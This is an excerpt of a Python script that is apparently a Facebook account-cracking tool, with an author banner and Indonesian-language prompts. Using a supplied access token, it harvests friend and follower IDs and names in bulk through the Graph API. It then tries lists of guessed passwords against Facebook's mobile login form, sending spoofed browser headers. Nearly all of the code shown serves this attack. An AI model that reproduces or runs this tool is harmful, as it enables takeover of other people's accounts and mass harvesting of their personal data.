...
#### BUAT BANNER
def banner():
    war_dom = random.choice([P,B,U,I,K,M])
    print("""
 _____________________________________________________
 __   ____  __ ____  _____  | Muhamad Syafii
 \ \ / /  \/  | __ )|  ___| | 27-12-1998
  \ V /| |\/| |  _ \| |_    | Syafii-XD
   | | | |  | | |_) |  _|   | Widiya Nastuion
   |_| |_|  |_|____/|_|     | 10-04-2022
_____________________________________________________
 |""")
...
def log_token():
    ...
    try:
        ...
        print(f"{B} | ")
        print(f"{B} | ")
        print(f"{H}[*] LOADING........");___fii___Sayang___Kamu___Widiya___()
    except KeyError:
        print(f"{B} | ")
...
def menu():
    ...
    try:
        ...
        print(f"{B} | ")
        print(f"{B} | ")
        jalan(f"{P}[!]{M} Token failed....");os.system("rm -rf masuk.txt");log_token()
    os.system("clear");banner()
    print(f"{B} | ")
...
def massal():
    try:
        ...
        print(f"{B} | ")
        print(f"{B} | ")
        print(f"{P}[!]{M} Token failed");os.system("rm -rf token.txt")
    try:
        print(f"{B} | ")
    ...
    for t in range(tanya_total):
        ...
        try:
            r= requests.get("https://graph.facebook.com/%s?fields=friends.limit(10000000)&access_token=%s"%(_id_,token))
            z=json.loads(r.text)
...
def listteman():
    ...
    try:
        r= requests.get("https://graph.facebook.com/me?fields=friends.limit(100000000)&access_token=%s"%(token))
        z=json.loads(r.text)
        for i in z['friends']['data']:
            uid = i["id"]
            nama = i["name"]
...
def publik():
    ...
    try:
        r= requests.get("https://graph.facebook.com/%s?fields=friends.limit(100000000)&access_token=%s"%(_id_,token))
        z=json.loads(r.text)
        for i in z['friends']['data']:
            uid = i["id"]
            nama = i["name"]
...
def followerss():
    ...
    _id_=input(f"{P}[*] Masukan user id : {B}")
    try:
        for i in requests.get("https://graph.facebook.com/%s/subscribers?limit=10000000&access_token=%s"%(_id_,token)).json()["data"]:
            uid = i["id"]
            nama = i["name"]
            id.append(uid+"<=>"+nama)
    except KeyError:
...
def log_hasil(user, pasw):
    ...
    "user-agent": "Mozilla/5.0 (Linux; Android 11; V2111) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.128 Mobile Safari/537.36"
    ...
    "referer": "https://www.facebook.com/login/?next&ref=dbl&fl&refid=8",
    "accept-encoding": "gzip, deflate",
    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
    })
    data = {}
    ged = par(ses.get("https://m.facebook.com/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
...
def mbasic(uid, fii):
	...
	for pw in fii:
		...
		pw = pw.lower()
		ses = requests.Session()
		ses.headers.update({"origin": "https://mbasic.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://m.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
...
def cek_log(uid,pw,ua):
	...
	data = {}
	ged = parser(ses.get("https://m.facebook.com/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("input"):
		if i.get("name") in list:
